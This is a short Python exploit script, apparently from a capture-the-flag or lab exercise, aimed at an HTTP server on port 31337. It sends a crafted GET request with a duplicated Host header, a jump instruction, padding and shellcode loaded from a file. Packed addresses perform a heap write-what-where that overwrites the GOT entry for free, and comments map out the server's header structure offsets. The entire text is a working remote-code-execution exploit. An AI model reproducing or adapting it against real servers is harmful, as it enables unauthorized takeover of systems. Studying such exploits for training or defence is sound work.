#!/usr/bin/python3

from socket import *
import struct
import sys

addr = '127.0.0.1'
if len(sys.argv) > 1:
    addr = sys.argv[1]
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

exploit = ""
with open("exploit64", "rb") as fh:
    exploit = fh.read()
#exploit is 150 bytes

what_ptr = 0x7ffff0000f88	#address of exploit on heap
where = 0x405018	#entry of free in got

x = b'GET /asdf.vbs HTTP/1.1\r\n'
x += b'Host: AAAA\r\n'	#legitimate header
x += b'GARBAGE: BBBB\r\n'	#Nonexistant header

x += b'Host:' 		#Same as first header
x += b'\xEB\x0E' 		#jump forward 14 bytes
x += b'A'*14		#padding that is overwritten during write-what-where
x += exploit				
x += b'A'*434 + struct.pack("<Q", what_ptr)
x += struct.pack("<Q", where)
x += b'ABCDABCD'		#overwrites hash, another way to force deletion
                            #don't need both this and nonexistant header
x += b'\r\n\r\n'

s.send(x)

#offsets within header_item
#flink - 0h
#blink - 8h
#hash - 10h
#key - 18h
#value - 20h (this points to offset 28h)
#value_data - 28h
#length - 268h
